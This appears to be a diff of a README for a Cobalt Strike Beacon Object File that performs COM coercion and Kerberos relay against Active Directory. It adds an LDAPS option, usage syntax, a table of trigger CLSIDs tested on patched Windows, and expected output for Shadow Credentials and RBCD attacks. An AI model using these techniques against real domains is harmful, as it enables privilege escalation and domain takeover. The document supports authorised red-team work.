@@ -4,8 +4,8 @@ NOTE: This has only been tested on Cobalt Strike. The BOF spawns a new thread, s
 A single-process Beacon Object File implementation of COM coercion and Kerberos relay. The BOF forwards machine-account authentication to a Python relay server for:
 
 - AD CS Web Enrollment (ESC8) over HTTP or HTTPS
-- Shadow Credentials over unsigned LDAP
-- Resource-Based Constrained Delegation (RBCD) over unsigned LDAP
+- Shadow Credentials over LDAP or LDAPS
+- Resource-Based Constrained Delegation (RBCD) over LDAP or LDAPS
 
 The Windows side is only a BOF. It does not upload an EXE, spawn a sacrificial process, inject code, or use sRDI/PIC.
 
@@ -22,12 +22,33 @@ This produces `bof/krbrelay.x64.o`. The default Makefile expects x64 MinGW-w64 a
 Load `krbrelay.cna` through Cobalt Strike's Script Manager. It adds:
 
 ```text
-krbrelay <relay_port> <service_spn> <rpc_endpoint>
+krbrelay <relay_port> <service_spn> <rpc_endpoint> [trigger_clsid]
 ```
 
 - `relay_port`: Python listener and `rportfwd_local` port.
 - `service_spn`: `http/CA_FQDN` or `ldap/DC_FQDN`.
 - `rpc_endpoint`: free loopback TCP port used by the temporary COM resolver. This is not the relay port.
+- `trigger_clsid`: optional COM activation class. The default is AxInstSv
+  (`{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}`), which produced Kerberos auth
+  type 16 at RPC auth level 2 on the tested fully patched Windows 11 host.
+
+Known trigger CLSIDs are:
+
+| COM class | CLSID | Platform availability | Current behavior |
+| --- | --- | --- | --- |
+| AxInstSv | `{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}` | Windows 10/11 | Default and verified in this lab. Produced SYSTEM/machine Kerberos type 16 at level 2, suitable for post-bind ShadowCred and RBCD over LDAP or LDAPS. |
+| PrintNotify | `{854A20FB-2D44-457D-992F-EF13785D2B51}` | Windows 10/11 and Server 2016/2019/2022 | Produced packet-integrity authentication on the patched lab host. Retained as a negative control; it is not suitable for the current unsigned post-bind LDAP(S) operations. |
+| McpManagementService | `{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}` | Windows 11 and Server 2022 | Former default. Its integrity-bearing exchange did not provide the working LDAPS path on the patched lab host; use for comparison and platform testing. |
+
+The CLSID chooses only the privileged authentication source. ShadowCred, RBCD,
+or AD CS is selected by the relay-server mode. Availability and RPC security
+flags can vary by Windows build and service configuration, so the list is not
+exhaustive; the BOF accepts any registered CLSID and prints the resulting
+authentication type and level.
+
+For LDAPS, use a fresh Beacon process so the BOF can establish the process-wide
+CONNECT-level Kerberos COM policy. The BOF prints the actual RPC auth type and
+level; LDAPS requires type `16` and level `2` or `3`.
 
 ## Network setup
 
@@ -112,6 +133,10 @@ Expected success:
 
 Success requires result `0` for the final LDAP bind and at least one queued ModifyResponse. `--target-dn` identifies the exact computer object, including its OU. ShadowCred defaults to two identical KCL candidates (`--padding-count 2`) to give the final bind time to complete. Set it to `1` for the single-write, no-extra-padding baseline; higher values increase the padding when needed. Because each candidate contains the same DN-Binary value, successful padding does not create multiple separate Key Credential entries. The script will not overwrite an existing NGC Shadow Credential value.
 
+For LDAPS, add `--ldap-port 636 --ldap-tls` and use the AxInstSv trigger (the
+default). The low-layer Kerberos bind completes before the ModifyRequest, so
+padding is unnecessary and `--padding-count 1` is sufficient.
+
 ## RBCD usage
 
 RBCD requires the SID of an account you control that has an SPN, commonly a computer account whose password you know. From the relay directory:
@@ -144,6 +169,8 @@ Expected success:
 
 This replaces `msDS-AllowedToActOnBehalfOfOtherIdentity` with a descriptor containing repeated identical ACEs for the supplied SID. `--padding-count` controls the ACE count and defaults to `8`; set it to `1` for no extra ACE padding.
 
+For LDAPS, add `--ldap-port 636 --ldap-tls` and use `--padding-count 1`.
+
 ## BOF success output
 
 ```text
@@ -151,8 +178,9 @@ This replaces `msDS-AllowedToActOnBehalfOfOtherIdentity` with a descriptor conta
 [+] Existing Kerberos-capable COM security accepted
 [*] Relay service principal: http/CA.example.test
 [+] COM resolver ready: ncacn_ip_tcp:127.0.0.1[7989]
-[*] Triggering COM object: McpManagementService
+[*] Triggering operator-selected COM activation
 [+] Relay bridge connected via 127.0.0.1:9598
+[*] RPC auth type=16 level=2 ASC req=<flags> ret=<flags>
 [*] Relayed authentication leg 1
 [*] Applied relay continuation to authentication leg 1
 [*] Relayed authentication leg 2
